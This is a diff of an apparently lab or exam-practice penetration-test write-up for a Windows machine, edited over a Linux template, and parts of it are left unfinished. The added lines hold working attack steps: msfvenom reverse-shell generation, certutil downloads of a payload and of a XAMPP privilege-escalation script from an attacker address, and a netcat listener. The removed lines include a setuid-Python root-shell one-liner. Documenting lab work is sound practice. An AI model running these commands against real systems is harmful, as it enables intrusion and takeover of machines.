@@ -3,25 +3,30 @@
 - Author: Henry Post
 - Target: Slort
 - Target IP: 1.2.3.4
-- Date: 03/01/2026
+- Date: 04/22/2026
 
 ## Executive Summary
 
-This machine, `hackme`, was enumerated by `nmap` to have ports 22 and 8000 open.
+%% This machine, `hackme`, was enumerated by `nmap` to have ports 22 and 8000 open.
 
 Port 8000 was running a `ladon` web service, which had default credentials of `admin:admin`.
 
 To get non-root access, I used `CVE-2025-1234` on `exploit-db.com`.
 
-From there, I identified a binary with elevated capabilities and used it to pivot to root.
+From there, I identified a binary with elevated capabilities and used it to pivot to root. %%
 
 ### Recommendations
-
+%% 
 1. Update Ladon to the latest non-vulnerable version.
 2. Do not use default credentials of `admin:admin`.
   3. Use strong credentials.
-4. Do not use `setuid` binary permissions on Python or other binaries. Instead, remove the `setuid` permission from binaries that do not need it.
+4. Do not use `setuid` binary permissions on Python or other binaries. Instead, remove the `setuid` permission from binaries that do not need it. %%
 
+## Resources
+
+- a
+- b
+- c
 ## Recon
 
 I ran an nmap scan that enumerated their ports:
@@ -146,47 +151,90 @@ We get non-SYSTEM shell.
 
 ![](Pasted%20image%2020260422153201.png)
 
+## SYSTEM access
 
+Well, victim runs `XAMPP v7.4.6, so...
 
+```sh
+searchsploit xampp
+# XAMPP 7.4.3 - Local Privilege Escalation | windows/local/50337.ps1
 
-I searched through exploit-db for CVE-2025-1234, and found a script:
+searchsploit --path 50337
 
-(IMG_PLACEHOLDER)
+cp /usr/share/exploitdb/exploits/windows/local/50337.ps1 ./
+```
 
-I ran the script once, and it failed:
+![](Pasted%20image%2020260422161545.png)
 
-    python 50640.py -t 192.168.68.24 -p 8000 -L 192.168.49.68 -p 4444
+We need to get a `shell.exe` binary on our victim and also modify the payload.
 
-(IMG_PLACEHOLDER)
+```sh
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.55 LPORT=80 -f exe -o shell.exe
+```
 
-So, I created a "Project" in Gerapy's web UI.
+We now need to use `certutil.exe` to download the exploit in our existing rev shell.
 
-(IMG_PLACEHOLDER)
+```powershell
+certutil.exe -urlcache -f http://192.168.49.55:80/shell.exe C:\xampp\shell.exe
+```
 
-I ran it again, and it succeeded.
+And here's our edited exploit.
 
-(IMG_PLACEHOLDER)
-    
-    ip a
-    whoami
-    hostname
-    date
-    cat local.txt
+```powershell
+# Exploit Title: XAMPP 7.4.3 - Local Privilege Escalation
+# Exploit Author: Salman Asad (@deathflash1411) a.k.a LeoBreaker
+# Original Author: Maximilian Barz (@S1lkys)
+# Date: 27/09/2021
+# Vendor Homepage: https://www.apachefriends.org
+# Version: XAMPP < 7.2.29, 7.3.x < 7.3.16 & 7.4.x < 7.4.4
+# Tested on: Windows 10 + XAMPP 7.3.10
+# References: https://github.com/S1lkys/CVE-2020-11107
 
-## Root access
+$file = "C:\xampp\xampp-control.ini"
+$find = ((Get-Content $file)[2] -Split "=")[1]
+# Insert your payload path here
+$replace = "C:\xampp\shell.exe"
+(Get-Content $file) -replace $find, $replace | Set-Content $file
+```
 
-For root access, I started by searching for binaries with this command that had the capability to run as root set:
+We download this too.
 
-    getcap -r / 2>/dev/null    
+```powershell
+certutil.exe -urlcache -f http://192.168.49.55:80/50337.ps1 C:\xampp\50337.ps1
+```
 
-(IMG_PLACEHOLDER)
+We then kill our python webserver and start `nc`.
 
-I found that `/usr/bin/python3.10` had the capability to run as root set, meaning we can get a root shell by running this command:
+```sh
+sudo nc -nvlp 80
+```
 
-    /usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+Then we trigger the exploit from our non-privileged reverse shell.
 
-(IMG_PLACEHOLDER)
+```powershell
+powershell.exe C:\xampp\50337.ps1
+```
 
+![](Pasted%20image%2020260422162136.png)
+
+We fail. We can't write that path as our current user.
+
+Let's try WinPEAS.
+
+```sh
+# on attacker
+wget https://github.com/peass-ng/PEASS-ng/releases/download/20260422-9567fd62/winPEAS.bat
+
+python3 -m http.server 80
+
+# on victim rev shell
+certutil.exe -urlcache -f http://192.168.49.55:80/winPEAS.bat C:\xampp\winPEAS.bat
+
+# to execute winPEAS.bat
+C:\xampp\winPEAS.bat
+```
+
+We notice that 
 ## Proof
 
 ### Local proof
